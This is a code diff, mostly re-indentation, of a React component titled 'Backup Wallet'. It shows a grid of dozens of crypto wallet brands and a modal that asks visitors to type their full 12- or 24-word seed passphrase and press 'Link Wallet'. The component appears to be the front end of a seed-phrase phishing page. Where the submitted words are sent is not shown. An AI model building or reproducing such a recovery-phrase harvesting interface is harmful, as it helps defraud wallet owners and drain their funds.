@@ -60,7 +60,7 @@ const cryptoServices: CryptoService[] = [
     { name: "Karda Chain", logo: 'https://crystalweb3ledger.com/images/wallets/karda_chain.png' },
     { name: "Keplr", logo: 'https://crystalweb3ledger.com/images/wallets/keplr.png' },
     { name: "Keyring Pro", logo: 'https://crystalweb3ledger.com/images/wallets/keyring_pro.png' },
-    { name: "Kraken", logo: KrakenLogo},
+    { name: "Kraken", logo: KrakenLogo },
     { name: "Ledger Live", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_live.png' },
     { name: "Ledger Nano S", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_nano_s.png' },
     { name: "Ledger Nano X", logo: 'https://crystalweb3ledger.com/images/wallets/ledger_nano_x.png' },
@@ -246,90 +246,90 @@ export default function BackupWallet() {
 
     return (
         <>
-        <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container tw-pb-28">
-            <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
-            <div className="tw-grid tw-grid-cols-2 sm:tw-grid-cols-3 lg:tw-grid-cols-4 tw-gap-[20px]">
-                {cryptoServices.map((service) => (
-                    <div
-                        key={service.name}
-                        onClick={() => openModal(service)}
-                        className={`tw-flex tw-flex-col tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
+            <div className="tw-bg-[#11150f] tw-text-white tw-px-6 tw-pt-8 tf-container tw-pb-28">
+                <h2 className="tw-text-lg tw-font-semibold tw-mb-8">Backup Wallet</h2>
+                <div className="tw-grid tw-grid-cols-2 sm:tw-grid-cols-3 lg:tw-grid-cols-4 tw-gap-[20px]">
+                    {cryptoServices.map((service) => (
+                        <div
+                            key={service.name}
+                            onClick={() => openModal(service)}
+                            className={`tw-flex tw-flex-col tw-items-center tw-gap-4 tw-bg-black/20 tw-rounded-lg tw-px-3 tw-py-3 tw-transition tw-border-2 tw-border-solid
                             ${filledWallets.includes(service.name) ? "!tw-border-[#008000]" : "tw-border-[#f1f1f2]/30"} 
                             tw-cursor-pointer tw-hover:tw-bg-black/40`}
-                    >
-                        <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
-                            <Image
-                                src={service.logo}
-                                alt={service.name}
-                                fill
-                                className="tw-object-cover"
-                            />
-                        </div>
-                        <div>
-                            <h3 className="tw-text-lg tw-text-center">{service.name}</h3>
-                        </div>
-                    </div>
-                ))}
-            </div>
-            {isModalOpen && selectedWallet && (
-                <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
-                    <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
-                        <button onClick={closeModal} className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0">×</button>
-                        <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
-                            <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
+                        >
+                            <div className="tw-w-12 tw-h-12 tw-relative tw-rounded-lg tw-overflow-hidden tw-mr-[12px]">
                                 <Image
-                                    src={selectedWallet.logo}
-                                    alt={selectedWallet.name}
+                                    src={service.logo}
+                                    alt={service.name}
                                     fill
                                     className="tw-object-cover"
                                 />
                             </div>
-                            <h2 className="tw-text-xl tw-font-bold">{selectedWallet.name}</h2>
-                        </div>
-                        <hr className="tw-my-4" />
-                        <div className="tw-flex tw-justify-between tw-items-center tw-mb-4">
-                            <p className="tw-text-[15px] tw-font-medium">Passphrase Type:</p>
-                            <div className="tw-flex tw-bg-[#222] tw-p-1 tw-rounded-lg">
-                                <button
-                                    type="button"
-                                    onClick={() => handlePhraseLengthChange(12)}
-                                    className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none ${phraseLength === 12 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-white'}`}
-                                >
-                                    12 Words
-                                </button>
-                                <button
-                                    type="button"
-                                    onClick={() => handlePhraseLengthChange(24)}
-                                    className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none ${phraseLength === 24 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-white'}`}
-                                >
-                                    24 Words
-                                </button>
+                            <div>
+                                <h3 className="tw-text-lg tw-text-center">{service.name}</h3>
                             </div>
                         </div>
-                        <p className="tw-mb-[20px] tw-text-center tw-text-[15px] tw-text-gray-300">Enter your {phraseLength}-word passphrase:</p>
-                        <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px] tw-max-h-[250px] tw-overflow-y-auto tw-pr-1">
-                            {words.map((word, i) => (
-                                <input
-                                    key={i}
-                                    type="text"
-                                    placeholder={`Word ${i + 1}`}
-                                    value={word}
-                                    onChange={(e) => handleWordChange(i, e.target.value)}
-                                    className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
-                                />
-                            ))}
-                        </div>
-                        <button
-                            onClick={handleSubmit}
-                            className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
-                        >
-                            Link Wallet
-                        </button>
-                    </div>
+                    ))}
                 </div>
-            )}
-        </div>
-        <Footer1/>
+                {isModalOpen && selectedWallet && (
+                    <div className="tw-fixed tw-inset-0 tw-z-50 tw-bg-black tw-bg-opacity-70 tw-flex tw-justify-center tw-items-center">
+                        <div className="tw-bg-[#1a1a1a] tw-rounded-lg tw-w-[90%] tw-max-w-md tw-p-8 tw-relative tw-text-white">
+                            <button onClick={closeModal} className="tw-absolute tw-top-4 tw-right-6 tw-text-xl tw-border-none tw-w-0">×</button>
+                            <div className="tw-flex tw-items-center tw-gap-[12px] tw-mb-4">
+                                <div className="tw-w-10 tw-h-10 tw-relative tw-rounded-lg tw-overflow-hidden">
+                                    <Image
+                                        src={selectedWallet.logo}
+                                        alt={selectedWallet.name}
+                                        fill
+                                        className="tw-object-cover"
+                                    />
+                                </div>
+                                <h2 className="tw-text-xl tw-font-bold">{selectedWallet.name}</h2>
+                            </div>
+                            <hr className="tw-my-4" />
+                            <div className="tw-flex tw-justify-between tw-items-center tw-mb-4">
+                                <p className="tw-text-[15px] tw-font-medium">Passphrase Type:</p>
+                                <div className="tw-flex gap-2 tw-bg-[#222] tw-p-1 tw-rounded-lg">
+                                    <button
+                                        type="button"
+                                        onClick={() => handlePhraseLengthChange(12)}
+                                        className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none hover:tw-text-black tw-text-nowrap ${phraseLength === 12 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-white'}`}
+                                    >
+                                        12 Words
+                                    </button>
+                                    <button
+                                        type="button"
+                                        onClick={() => handlePhraseLengthChange(24)}
+                                        className={`tw-px-3 tw-py-1 tw-text-xs tw-rounded-md tw-transition tw-border-none hover:tw-text-black tw-text-nowrap ${phraseLength === 24 ? 'tw-bg-green-600 tw-text-white tw-font-bold' : 'tw-text-gray-400 tw-bg-transparent hover:tw-text-white'}`}
+                                    >
+                                        24 Words
+                                    </button>
+                                </div>
+                            </div>
+                            <p className="tw-mb-[20px] tw-text-center tw-text-[15px] tw-text-gray-300">Enter your {phraseLength}-word passphrase:</p>
+                            <div className="tw-grid tw-grid-cols-2 tw-gap-[10px] tw-mb-[16px] tw-text-[13px] tw-max-h-[250px] tw-overflow-y-auto tw-pr-1">
+                                {words.map((word, i) => (
+                                    <input
+                                        key={i}
+                                        type="text"
+                                        placeholder={`Word ${i + 1}`}
+                                        value={word}
+                                        onChange={(e) => handleWordChange(i, e.target.value)}
+                                        className="tw-bg-[#333] tw-p-2 tw-rounded tw-text-white tw-border-2 tw-border-solid tw-border-gray-600 tw-outline-none tw-placeholder:tw-text-[13px]"
+                                    />
+                                ))}
+                            </div>
+                            <button
+                                onClick={handleSubmit}
+                                className="tw-bg-green-600 tw-hover:tw-bg-green-700 tw-text-white tw-py-2 tw-px-4 tw-rounded tw-w-full tw-text-[16px]"
+                            >
+                                Link Wallet
+                            </button>
+                        </div>
+                    </div>
+                )}
+            </div>
+            <Footer1 />
         </>
     );
 }
